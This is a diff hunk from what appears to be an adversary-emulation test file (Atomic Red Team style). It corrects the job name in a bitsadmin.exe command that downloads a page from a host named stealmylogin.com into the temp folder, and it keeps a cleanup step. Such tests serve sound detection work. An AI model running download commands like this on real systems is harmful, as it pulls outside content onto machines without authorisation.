@@ -12,7 +12,7 @@ atomic_tests:
     name: command_prompt
     elevation_required: false
     command: |
-      bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html
+      bitsadmin.exe /transfer "DownloadedFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html
     cleanup_command: |
       del %TEMP%\bitsadmindownload.html
 
